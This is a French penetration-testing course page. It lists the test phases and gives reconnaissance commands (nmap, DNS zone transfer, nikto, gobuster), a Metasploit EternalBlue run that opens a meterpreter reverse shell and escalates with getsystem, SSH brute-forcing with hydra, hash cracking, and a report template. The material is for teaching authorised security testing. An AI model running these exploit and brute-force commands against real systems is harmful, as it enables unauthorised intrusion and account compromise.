# 🎯 Tests d'Intrusion

## Méthodologie

| Phase | Description |
|-------|-------------|
| **1. Recueil d'informations** | Reconnaissance passive et active |
| **2. Scanner** | Détection des vulnérabilités |
| **3. Exploitation** | Exploitation des vulnérabilités |
| **4. Post-exploitation** | Maintien d'accès, escalade |
| **5. Rapport** | Documentation et recommandations |

## Outils de reconnaissance

### Nmap

```bash
# Scan de base
nmap 192.168.1.0/24

# Scan détaillé
nmap -sV -sC -O 192.168.1.50

# Scan agressif
nmap -A -T4 192.168.1.50

# Scan avec scripts vuln
nmap --script vuln 192.168.1.50

# Résultat en XML
nmap -oX scan.xml 192.168.1.50
```

### Autres outils

```bash
# Whois
whois example.com

# DNS reconnaissance
dig example.com ANY
dig @ns1.example.com example.com AXFR

# HTTP reconnaissance
nikto -h http://192.168.1.50
gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt
```

## Outils d'exploitation

### Metasploit

```bash
# Lancer Metasploit
msfconsole

# Rechercher un module
search eternalblue

# Utiliser un module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run

# Session Meterpreter
sessions -i 1
getsystem
```

### Outils divers

```bash
# Hydra - Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50

# John the Ripper - Hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat - GPU cracking
hashcat -m 0 -a 0 hashes.txt wordlist.txt
```

## Rapport de test

```markdown
# Rapport de Test d'Intrusion

## Résumé exécutif
[Bilan global des risques identifiés]

## Vulnérabilités critiques
- Vulnérabilité 1 : Description, impact, preuve, recommandation
- Vulnérabilité 2 : ...

## Vulnérabilités mineures
- Vulnérabilité 3 : ...

## Recommandations prioritaires
1. Action corrective 1
2. Action corrective 2
```

---

*Ce contenu sera enrichi au fil des cours.*
